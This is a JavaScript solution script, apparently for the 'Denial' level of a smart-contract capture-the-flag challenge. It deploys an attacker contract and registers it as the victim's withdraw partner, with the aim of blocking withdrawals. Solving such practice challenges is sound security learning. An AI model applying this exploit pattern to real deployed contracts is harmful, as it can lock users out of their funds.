const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    console.log('Load Denial victim contract.')
    const victim = loader.web3.fromArtifact('Denial', instance)

    console.log('Deploy attacker contract...')
    const { options: { address } } = await loader.web3.fromArtifact('HackDenial').deploy().send()

    console.log('Set deployed attacker contract as withdraw partner...')
    await victim.methods.setWithdrawPartner(address).send()

    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
